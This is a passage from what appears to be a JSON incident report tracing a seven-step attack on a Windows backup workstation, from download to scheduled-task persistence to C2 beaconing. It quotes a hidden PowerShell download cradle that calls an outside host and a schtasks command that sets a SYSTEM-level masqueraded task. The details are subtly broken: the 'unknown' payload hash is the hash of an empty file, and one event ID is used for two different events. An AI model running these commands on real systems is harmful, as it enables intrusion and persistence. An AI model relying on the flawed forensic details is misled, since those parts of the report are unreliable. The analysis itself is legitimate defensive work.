{
  "severity": "high",
  "network_observations": [
    {"ip": "10.50.6.41", "inferred_role": "compromised_backup_workstation", "first_seen": "2027-11-18T01:08:54+0100", "last_seen": "2027-11-18T03:01:48+0100", "agent_name": "WS-BACKUP-04.corp.local"},
    {"ip": "185.220.101.91", "inferred_role": "external_c2_beacon_destination", "first_seen": "2027-11-18T03:00:14+0100", "last_seen": "2027-11-18T03:01:48+0100"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Command and Control / Ingress Tool Transfer", "technique": "T1105", "what_happened": "At 2027-11-18 01:08:54 CEST (deep off-hours), Sysmon Event 1 fired on WS-BACKUP-04 (10.50.6.41) for a powershell.exe process with commandLine 'powershell.exe -nop -w hidden -c \"Invoke-WebRequest http://updateserver-cdn.net/winupd.exe -OutFile C:\\ProgramData\\winupd.exe\"'. The flags '-nop -w hidden' (NoProfile + Hidden window) are classic download-cradle obfuscation. The User context is CORP\\svc-backup01 — a SERVICE account. Service accounts NEVER interactively launch powershell.exe at 01:08 in the morning; they run non-interactive scheduled-task / service workloads. This is the first major anomaly.", "chain_reason": "Sysmon Event 1: image=powershell.exe + commandLine contains 'Invoke-WebRequest http://' + '-OutFile C:\\ProgramData\\' + '-nop -w hidden' + user=CORP\\svc-backup01. The combination 'service-account + interactive PowerShell + Invoke-WebRequest to non-corporate URL + write to ProgramData + off-hours' is the canonical download-cradle pattern.", "first_seen": "2027-11-18T01:08:54+0100"},
    {"step": 2, "tactic": "Resource Development / Stage Capabilities", "technique": "T1608.001", "what_happened": "At 01:11:42 (2 minutes 48 seconds later — typical Invoke-WebRequest download latency for a ~few-MB payload), Sysmon Event 11 (FileCreate) fired on WS-BACKUP-04 for targetFilename=C:\\ProgramData\\winupd.exe with signed=false and hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855. The binary landed UNSIGNED in C:\\ProgramData (a world-writable program directory frequently abused as a malware drop location because it is excluded from most basic AV scan paths and many users have implicit write access). The hash is unrecognized in the local TI catalog — first-seen-in-environment.", "chain_reason": "Sysmon Event 11 FileCreate: targetFilename=C:\\ProgramData\\winupd.exe + signed=false + hash unknown to TI. Combined with Step 1's download cradle commandLine, the two events form a complete download → write-to-disk transition with matching timing.", "first_seen": "2027-11-18T01:11:42+0100"},
    {"step": 3, "tactic": "Persistence / Privilege Escalation (Scheduled Task)", "technique": "T1053.005", "what_happened": "At 01:11:44 (2 seconds after the file landed), Windows Security Event 4698 'A scheduled task was created' fired on WS-BACKUP-04: TaskName=\\Microsoft\\Windows\\Update\\WindowsUpdateSvc, RunAs=SYSTEM (privilege escalation from svc-backup01 → SYSTEM at task-trigger time), Author=CORP\\svc-backup01, ActionsXML=<Exec><Command>C:\\ProgramData\\winupd.exe</Command></Exec>, Trigger=Daily 03:00. The TaskName is MASQUERADED as a legitimate Microsoft Windows Update component (the real path is \\Microsoft\\Windows\\WindowsUpdate, NOT \\Microsoft\\Windows\\Update\\WindowsUpdateSvc — the attacker invented a believable subpath that defenders will overlook in a casual review). RunAs=SYSTEM means the binary will execute at the highest possible local privilege, escalating from the service-account context the attacker currently inhabits. Trigger=Daily 03:00 = long-term recurring beacon, scheduled to fire 1 hour 48 minutes after creation.", "chain_reason": "Windows Security Event 4698 (task create): TaskName contains 'WindowsUpdateSvc' under the Microsoft\\Windows\\Update tree + RunAs=SYSTEM + Author=CORP\\svc-backup01 + Action.Command=C:\\ProgramData\\winupd.exe (the exact unsigned binary from Step 2). The Author + Action linkage proves the same actor that ran the download also created the persistence.", "first_seen": "2027-11-18T01:11:44+0100"},
    {"step": 4, "tactic": "Persistence (Scheduled Task — Command-Line Method)", "technique": "T1053.005", "what_happened": "At 01:11:45 (1 second after the 4698 fired), Sysmon Event 1 fired for image=schtasks.exe with commandLine 'schtasks.exe /create /tn \"\\Microsoft\\Windows\\Update\\WindowsUpdateSvc\" /tr \"C:\\ProgramData\\winupd.exe\" /sc DAILY /st 03:00 /ru SYSTEM /f' under parentImage=powershell.exe (the SAME PowerShell process from Step 1's download cradle) and user=CORP\\svc-backup01. The schtasks.exe command line is the LITERAL command that produced the Event 4698 in Step 3 — schtasks.exe is the canonical CLI for Windows Task Scheduler; defenders should treat any schtasks.exe child-of-powershell.exe under a non-admin context as high-suspicion. The /f flag forces overwrite without prompt, /ru SYSTEM elevates the run-as context, /sc DAILY /st 03:00 establishes the recurring trigger.", "chain_reason": "Sysmon Event 1: image=schtasks.exe + commandLine contains '/create' + '/tn' with masqueraded task name + '/tr C:\\ProgramData\\winupd.exe' + '/ru SYSTEM' + parentImage=powershell.exe + user=CORP\\svc-backup01. parentImage=powershell.exe is the smoking-gun lineage: legitimate scheduled-task creation happens via Group Policy / sccm / mmc, NOT via interactive powershell.exe spawning schtasks.exe.", "first_seen": "2027-11-18T01:11:45+0100"},
    {"step": 5, "tactic": "Execution (Scheduled Task Trigger) + Privilege Escalation", "technique": "T1053.005 + T1078.003", "what_happened": "At 03:00:01 (1 hour 48 minutes 17 seconds after task creation — the attacker waited for the Daily 03:00 trigger fire), three correlated events fired on WS-BACKUP-04: (a) Windows Security Event 4698 'task triggered' for \\Microsoft\\Windows\\Update\\WindowsUpdateSvc, (b) Windows Security Event 4624 'logon success' targetUserName=SYSTEM logonType=5 (Service) — confirming Task Scheduler invoked the action under SYSTEM, (c) Sysmon Event 1 for image=C:\\ProgramData\\winupd.exe with parentImage=svchost.exe (Task Scheduler host) and user=NT AUTHORITY\\SYSTEM. The unsigned binary that landed at 01:11:42 is now executing as SYSTEM. Full privilege escalation achieved.", "chain_reason": "Three-event correlation: Event 4698 (trigger) + Event 4624 logonType=5 (service logon under SYSTEM) + Sysmon Event 1 (winupd.exe execution under svchost.exe parent, user=SYSTEM). Linkage: agent.name + timestamp (3-second window) + task name.", "first_seen": "2027-11-18T03:00:01+0100"},
    {"step": 6, "tactic": "Command and Control (TLS Beacon)", "technique": "T1071.001 + T1573.002", "what_happened": "At 03:00:14 (13 seconds after winupd.exe started executing), Sysmon Event 3 (Network Connection) fired: image=C:\\ProgramData\\winupd.exe → data.dest_ip=185.220.101.91 on dest_port=443, protocol TLS. The first beacon. Sustained connections were observed every 60 seconds after, indicating a fixed-interval keep-alive. The destination IP belongs to Hetzner Netherlands per WHOIS — an AS that hosts both legitimate VPS workloads AND a significant volume of attacker / Tor exit / C2 infrastructure (TI: AbuseConfidenceScore 87/100, categorization 'C2'). The destination port 443 + TLS = encrypted-channel evasion: payload contents invisible to the IDS without TLS inspection / decryption.", "chain_reason": "Sysmon Event 3: image=C:\\ProgramData\\winupd.exe (the unsigned binary that just escalated to SYSTEM) + data.dest_ip=185.220.101.91 + data.dest_port=443. The fixed 60s cadence + destination on an abuse-tolerant AS + protocol TLS = standard malware C2 beacon signature.", "first_seen": "2027-11-18T03:00:14+0100"},
    {"step": 7, "tactic": "Command and Control (DGA-style DNS)", "technique": "T1568.002 + T1071.004", "what_happened": "At 03:01:48 (1 minute 47 seconds into the beacon phase), Sysmon Event 22 (DNS Query) fired: image=C:\\ProgramData\\winupd.exe queryName=c2-updater.net. The domain pattern (c2- prefix + .net TLD + clearly contrived label) reads as either DGA-generated or hand-crafted as a fallback channel — the attacker likely has a primary IP-based channel (185.220.101.91) AND a domain-based fallback that resolves to attacker-controlled IPs that can rotate without touching the malware's hard-coded IP. The lookup happened OUTBOUND from a SYSTEM-context process initiated by a scheduled task — there is NO legitimate reason for an unsigned binary masquerading as a Windows Update component to do unsupervised DNS lookups for a non-Microsoft domain.", "chain_reason": "Sysmon Event 22: image=C:\\ProgramData\\winupd.exe + queryName=c2-updater.net. The label 'c2-updater' is essentially the attacker's signature in plain sight; combined with the C2 IP from Step 6 it confirms a multi-channel C2 design.", "first_seen": "2027-11-18T03:01:48+0100"}
  ],
  "time_window": {"start": "2027-11-18T01:08:54+0100", "end": "2027-11-18T03:01:48+0100"},
